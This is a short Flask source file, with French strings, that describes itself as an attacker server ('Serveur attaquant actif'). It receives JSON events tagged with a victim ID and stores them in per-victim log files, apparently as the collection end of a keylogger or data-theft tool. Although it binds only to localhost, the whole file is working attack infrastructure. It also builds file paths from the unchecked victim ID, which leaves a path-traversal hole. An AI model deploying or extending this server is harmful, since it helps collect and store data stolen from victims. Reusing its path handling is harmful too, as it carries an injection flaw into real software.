from flask import Flask, request, jsonify
import json, os

app = Flask(__name__)

os.makedirs("stockage", exist_ok=True)

@app.post("/log")
def log():
    data = request.get_json(silent=True)
    if not data:
        return jsonify({"error": "Invalid JSON"}), 400

    victim = data.get("victim_id", "unknown")
    os.makedirs(f"stockage/{victim}", exist_ok=True)

    path = f"stockage/{victim}/events.jsonl"
    with open(path, "a") as f:
        f.write(json.dumps(data) + "\n")

    return jsonify({"status": "ok"}), 200

@app.get("/")
def home():
    return "Serveur attaquant actif"

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000)
